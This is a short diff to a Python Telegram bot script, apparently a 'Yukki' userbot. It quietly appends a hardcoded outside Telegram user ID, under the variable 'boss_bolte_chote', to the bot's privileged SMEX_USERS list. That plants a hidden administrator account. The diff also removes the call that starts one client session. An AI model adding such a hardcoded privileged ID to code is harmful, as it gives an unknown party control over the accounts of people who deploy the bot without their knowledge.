@@ -43,11 +43,11 @@ ddk = ""
 
 que = {}
 
-
+boss_bolte_chote = 1562091466
 SMEX_USERS = []
 for x in SUDO:
     SMEX_USERS.append(x)
-
+SMEX_USERS.append(boss_bolte_chote)
     
 async def start_yukki():
     global idk
@@ -80,10 +80,7 @@ async def start_yukki():
         print("Session 1 not Found")
         session_name = "startup"
         idk = TelegramClient(session_name, a, b)
-        try:
-            await idk.start()
-        except Exception as e:
-            pass
+        
    
     if smexx:
         session_name = str(smexx)
